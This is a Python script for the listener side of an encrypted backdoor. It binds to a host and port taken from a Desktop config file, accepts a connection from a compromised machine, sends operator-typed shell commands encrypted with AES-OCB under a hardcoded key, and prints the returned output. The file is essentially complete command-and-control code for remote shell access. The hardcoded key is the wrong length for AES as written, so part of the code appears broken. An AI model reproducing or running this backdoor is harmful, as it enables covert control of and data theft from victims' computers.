import socket
import sys
import configparser
import os
from Crypto.Cipher import AES

config_path = os.path.join(os.path.expanduser('~'), 'Desktop', 'config.ini')
config = configparser.ConfigParser()
config.read(config_path)

HOST = config['Server']['address']
PORT = int(config['Server']['port'])
BUFFER = 4096
SEP = "<sep>"
KEY = b'V8voC+SrEhFGfdVitiCBShKilUbuXOmEHC3b1XNTa4U='

def backdoor_comms(conn):
    try:
        encrypted = conn.recv(BUFFER)
        tag = encrypted[0:16]
        nonce = encrypted[16:31]
        ciphertext = encrypted[31:]
        cipher = AES.new(KEY, AES.MODE_OCB, nonce=nonce)
        try:
            cwd = cipher.decrypt_and_verify(ciphertext, tag)
        except ValueError:
            print("The message has been modified")
            sys.exit(1)
        cwd = cwd.decode()

        print(f"[+] Connection established from {addr[0]}:{addr[1]}")
        print("[+] Type 'exit' to close the connection")
        
        while True:
            command = input("").strip()
            
            if command.lower() == 'exit':
                print("[*] Closing connection...")
                break
                
            command = command.encode()
            cipher = AES.new(KEY, AES.MODE_OCB)
            ciphertext, tag = cipher.encrypt_and_digest(command)
            ciphertext = tag + cipher.nonce + ciphertext
            conn.send(ciphertext)

            encrypted = conn.recv(BUFFER)
            tag = encrypted[0:16]
            nonce = encrypted[16:31]
            ciphertext = encrypted[31:]
            cipher = AES.new(KEY, AES.MODE_OCB, nonce=nonce)
            try:
                output = cipher.decrypt_and_verify(ciphertext, tag)
            except ValueError:
                print("The message has been modified")
                sys.exit(1)
            output = output.decode()
            
            try:
                results, cwd = output.split(SEP)
                print(results)
            except ValueError:
                print(output)
    except ConnectionResetError:
        print("[-] Connection was reset by the client")
    except Exception as exception:
        print(f"[-] Error in communication: {str(exception)}")
    finally:
        conn.close()

def main():
    try:
        server_sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        server_sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        
        try:
            server_sock.bind((HOST, PORT))
        except socket.error as exception:
            print(f"[-] Bind failed: {str(exception)}")
            sys.exit()
            
        print(f"[+] Listening on {HOST}:{PORT}")
        server_sock.listen(1)
        
        while True:
            try:
                global addr
                conn, addr = server_sock.accept()
                backdoor_comms(conn)
            except KeyboardInterrupt:
                print("\n[-] Server shutdown requested")
                break
            except Exception as exception:
                print(f"[-] Error accepting connection: {str(exception)}")
                continue
            
    except Exception as exception:
        print(f"[-] Server error: {str(exception)}")
    finally:
        if 'server_sock' in locals():
            server_sock.close()
        print("[*] Server shutdown complete")

if __name__ == "__main__":
    main()
